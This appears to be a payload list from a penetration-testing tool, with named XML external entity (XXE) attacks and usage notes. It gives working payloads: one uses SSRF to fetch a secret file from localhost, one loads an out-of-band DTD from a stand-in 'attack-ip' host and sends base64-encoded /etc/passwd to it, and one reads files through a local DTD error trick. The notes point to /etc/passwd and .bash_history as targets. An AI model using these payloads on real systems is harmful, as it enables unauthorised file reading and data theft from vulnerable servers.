attack.name: XXE Locator
attack.desc: This is a basic entity test. If the field is vulnerable the XML parser parses the external entities the result should have Marantral in the firstname and Mantroll in the last name. Etities are defined inside the DOCTYPE element. Also set the content-type to application/xml

attack.name: XXE Linux File Classic 1
attack.desc: Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. /etc/passwd is a common file on Linux. You will want to modify that to what you are trying to get. There are always good things on .bash_history and other common locations

attack.name: XXE + SSRF attack
attack.code: <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM "http://127.0.0.1/secret_pass.txt" > ]> <foo>&xxe;</foo>
attack.desc: XXE can be combined with the SSRF vulnerability to target another service. Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
attack.label: SSRF XXE

attack.name: XXE OOB with DTD and PHP filter
attack.code:
---Code to call the XXE--- <?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://attack-ip/dtd.xml"> %sp; %param1; ]> <r>&exfil;</r>
---dtd.xml File -- <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attack-ip/dtd.xml?%data;'>">
attack.desc: You will have to host a web server hosting the dtd.xml file. you will also have to change the ip addresses maked with attack-ip
attack.label: XXE OOB

attack.name: XXE with local DTD
attack.code:
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/WHATEVERLOCAL.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY % file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
        <!ENTITY % eval <!ENTITY &#x25; error SYSTEM 'file:///abcxyz/%file;'>">
        %eval;
        %error;
        '>

    %local_dtd;
]>
<root></root>
attack.desc: You will have to find out what the local dtd file is called. This would be most likely done because of a verbose error message. If that does occure, you can then pick files to read and when you put them into the payload the content of the file should be placed in the error message.
attack.label: XXE OOB
